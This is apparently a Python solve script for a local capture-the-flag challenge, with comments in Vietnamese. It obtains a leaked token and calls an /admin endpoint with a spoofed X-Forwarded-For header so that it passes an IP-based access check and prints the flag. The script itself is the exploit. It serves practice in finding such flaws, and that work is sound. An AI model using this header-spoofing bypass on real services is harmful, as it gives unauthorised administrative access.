import requests
import sys

# Bạn có thể đổi hai BASE_URL này cho phù hợp môi trường local của bạn.
BACKEND = "http://127.0.0.1:8000"   # FastAPI main.py
CLIENT  = "http://127.0.0.1:5000"  

def get_token_from_backend():
    r = requests.post(f"{BACKEND}/auth", timeout=5)
    r.raise_for_status()
    return r.json()

def get_token_via_client_redirect():
    # Client / -> 302 đến /menu?simple_token=...
    r = requests.get(f"{CLIENT}/", allow_redirects=False, timeout=5)
    loc = r.headers.get("Location", "")
    if "simple_token=" not in loc:
        raise RuntimeError("Không trích xuất được token từ client redirect")
    return loc.split("simple_token=", 1)[1]

def get_flag(token):
    headers = {
        "Simple-Token": token,
        "X-Forwarded-For": "127.0.0.1",
    }
    r = requests.get(f"{BACKEND}/admin", headers=headers, timeout=5)
    # 401 nếu thiếu token hoặc sai X-Forwarded-For
    r.raise_for_status()
    return r.json()

def main():
    # Ưu tiên lấy token trực tiếp từ backend; nếu thất bại, thử qua client
    try:
        token = get_token_from_backend()
    except Exception as e:
        print(f"[!] Lấy token trực tiếp từ backend lỗi: {e}")
        print("[*] Thử lấy token qua client ...")
        token = get_token_via_client_redirect()
    print(f"[+] TOKEN = {token}")

    flag_json = get_flag(token)
    print(f"[+] FLAG = {flag_json.get('message')}")

if __name__ == "__main__":
    main()
